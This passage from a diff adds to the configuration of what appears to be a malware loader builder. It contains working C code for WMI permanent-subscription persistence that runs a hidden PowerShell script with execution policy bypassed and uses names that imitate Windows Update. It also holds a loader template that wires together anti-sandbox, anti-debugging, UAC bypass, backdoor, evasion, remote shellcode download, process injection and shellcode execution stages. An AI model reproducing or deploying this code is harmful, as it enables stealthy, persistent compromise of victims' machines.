+      placeholder: "MicrosoftWindowsUpdateFilter"
+    - id: wmi_consumer_name
+      label: "WMI Consumer Name"
+      type: textbox
+      defaultValue: "MicrosoftWindowsUpdateConsumer"
+      placeholder: "MicrosoftWindowsUpdateConsumer"
+    snippet: |
+      // Persistence: WMI Permanent Event Subscription
+      // Registers a permanent WMI subscription in the root\subscription namespace:
+      //   __EventFilter  — WQL query on Win32_LogonSession creation (type 2 = interactive)
+      //   CommandLineEventConsumer — runs the payload when the event fires
+      //   __FilterToConsumerBinding — links the two objects
+      // Entries live in the WMI repository, not in the registry or Task Scheduler.
+      // Survives reboots; SYSTEM-level execution context. Requires administrator rights.
+      // wash_payload_path() returns the Installation-category path when set, otherwise
+      // falls back to the current module path (run-in-place mode).
+      // Implemented via a UTF-16LE PS1 temp file to avoid COM ceremony in C++.
+      // Compatible with Windows 10/11 and Windows Server 2016+.
+      {
+          wash_demand_elevation_or_shutdown(0, 300);
+          WCHAR _wm_exe[MAX_PATH]       = {0};
+          WCHAR _wm_tmp_base[MAX_PATH]  = {0};
+          WCHAR _wm_tmp[MAX_PATH]       = {0};
+          WCHAR _wm_cmd[512]            = {0};
+          WCHAR _wm_scr[2048]           = {0};
+          STARTUPINFOW        _wm_si = {sizeof(_wm_si)};
+          PROCESS_INFORMATION _wm_pi = {0};
+          wcscpy_s(_wm_exe, MAX_PATH, wash_payload_path());
+          wash_track(_wm_exe);
+          GetTempPathW(MAX_PATH, _wm_tmp_base);
+          wsprintfW(_wm_tmp, L"%swusa_svc.ps1", _wm_tmp_base);
+          // Build PowerShell script that creates the three WMI objects.
+          // Single-quoted PS strings: '' is an escaped single-quote inside them.
+          // $ct wraps the exe path in double-quotes to handle spaces in the path.
+          wsprintfW(_wm_scr,
+              L"$e='%s';"
+              L"$ct='\"'+$e+'\"';"
+              L"$f=Set-WmiInstance -Namespace root\\subscription "
+              L"-Class __EventFilter "
+              L"-Arguments @{Name='$wmi_filter_name$';"
+              L"EventNameSpace='root\\cimv2';"
+              L"QueryLanguage='WQL';"
+              L"Query='SELECT * FROM __InstanceCreationEvent WITHIN 30 "
+              L"WHERE TargetInstance ISA ''Win32_LogonSession'' "
+              L"AND TargetInstance.LogonType=2'};"
+              L"$c=Set-WmiInstance -Namespace root\\subscription "
+              L"-Class CommandLineEventConsumer "
+              L"-Arguments @{Name='$wmi_consumer_name$';"
+              L"CommandLineTemplate=$ct};"
+              L"Set-WmiInstance -Namespace root\\subscription "
+              L"-Class __FilterToConsumerBinding "
+              L"-Arguments @{Filter=$f;Consumer=$c};",
+              _wm_exe);
+          HANDLE _wm_fh = CreateFileW(_wm_tmp, GENERIC_WRITE, 0, NULL,
+                                      CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+          if (_wm_fh != INVALID_HANDLE_VALUE) {
+              DWORD _wm_dw      = 0;
+              BYTE  _wm_bom[2]  = {0xFF, 0xFE};
+              WriteFile(_wm_fh, _wm_bom, 2, &_wm_dw, NULL);
+              WriteFile(_wm_fh, _wm_scr,
+                        (DWORD)(wcslen(_wm_scr) * sizeof(WCHAR)), &_wm_dw, NULL);
+              CloseHandle(_wm_fh);
+              wsprintfW(_wm_cmd,
+                        L"powershell.exe -NoProfile -WindowStyle Hidden "
+                        L"-ExecutionPolicy Bypass -File \"%s\"",
+                        _wm_tmp);
+              _wm_si.dwFlags     = STARTF_USESHOWWINDOW;
+              _wm_si.wShowWindow = SW_HIDE;
+              if (CreateProcessW(NULL, _wm_cmd, NULL, NULL, FALSE,
+                                 CREATE_NO_WINDOW, NULL, NULL, &_wm_si, &_wm_pi)) {
+                  WaitForSingleObject(_wm_pi.hProcess, 15000);
+                  CloseHandle(_wm_pi.hProcess);
+                  CloseHandle(_wm_pi.hThread);
+              }
+              DeleteFileW(_wm_tmp);
+          }
+      }
+
+templates:
+- id: default
+  display: Default Loader
+  description: Full-featured loader with every playbook section wired up. The only template - swap snippets per section to tune behavior.
+  content: |
+    #define WIN32_LEAN_AND_MEAN
+    #include <windows.h>
+    #include <winternl.h>
+    #include <intrin.h>
+    #include <tlhelp32.h>
+    #include <shlobj.h>
+    #include <shellapi.h>
+    #include <iphlpapi.h>
+    #include <lm.h>
+    #pragma comment(lib, "iphlpapi.lib")
+    #pragma comment(lib, "netapi32.lib")
+    #pragma comment(lib, "shell32.lib")
+
+    {{PREAMBLE}}
+
+    {{PROCESS_LOOKUP_HELPER}}
+
+    INT main(VOID)
+    {
+        // Stage 1 - environment probing (cheap, runs first so bail-outs are fast).
+        {{ANTI_EMULATION}}
+        {{ANTI_SANDBOX}}
+        {{GUARDRAILS}}
+
+        // Stage 2 - debugger / analyst countermeasures.
+        {{ANTI_DEBUGGING}}
+        {{ANTI_ANALYSIS}}
+
+        // Stage 3 - misdirection.
+        {{DECOY}}
+
+        // Stage 4 - elevation, install, persistence wiring.
+        {{UAC_BYPASS}}
+        {{INSTALLATION}}
+        {{BACKDOOR_CONFIG}}
+        {{PERSISTENCE}}
+        {{EVASION}}
+
+        // Stage 5 - load & deliver payload.
+        {{SHELLCODE_SOURCE}}
+        {{SHELLCODE_URL}}
+
+        {{PROCESS_INJECTION}}
+        {{SHELLCODE_EXECUTION}}
+
+        Sleep(1);
+        return 0;
+    }
+  placeholders:
+  - name: PREAMBLE
+    kind: system
+  - name: PROCESS_LOOKUP_HELPER
+    kind: system
+  - name: SHELLCODE_SOURCE
+    kind: system
+  - name: SHELLCODE_URL
+    kind: system
+  - name: ANTI_EMULATION
+    kind: snippet
+    snippetTemplate: antiemulation
+  - name: ANTI_SANDBOX
+    kind: snippet
+    snippetTemplate: antisandbox
+  - name: GUARDRAILS
+    kind: snippet
+    snippetTemplate: guardrail
+  - name: ANTI_DEBUGGING
+    kind: snippet
+    snippetTemplate: antidebugging
+  - name: ANTI_ANALYSIS
+    kind: snippet
+    snippetTemplate: antianalysis
+  - name: DECOY
+    kind: snippet
+    snippetTemplate: decoy
+  - name: UAC_BYPASS
+    kind: snippet
+    snippetTemplate: uacb
+  - name: INSTALLATION
+    kind: snippet
+    snippetTemplate: installation
+  - name: BACKDOOR_CONFIG
+    kind: snippet
+    snippetTemplate: backdoorconfig
+  - name: PERSISTENCE
+    kind: snippet
+    snippetTemplate: persistence
+  - name: EVASION
+    kind: snippet
+    snippetTemplate: evasion
+  - name: PROCESS_INJECTION
+    kind: snippet
+    snippetTemplate: psinjection
+  - name: SHELLCODE_EXECUTION
+    kind: snippet
+    snippetTemplate: shellcodeexecution
